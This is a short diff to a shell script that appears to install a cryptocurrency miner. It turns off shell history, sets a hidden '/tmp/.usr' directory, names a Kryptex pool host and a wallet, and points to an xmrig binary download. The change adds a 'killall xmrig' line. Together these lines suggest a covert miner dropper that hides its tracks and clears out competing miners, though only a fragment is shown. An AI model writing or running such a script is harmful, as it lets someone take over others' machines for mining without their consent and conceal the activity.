@@ -5,6 +5,10 @@ set +o history
 
 HOST="zeph.kryptex.network"
 
+killall xmrig
+
+
+
 ROOT_path="/tmp/.usr"
 wallet="snake9411@proton.me"
 xmrig_url="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz"
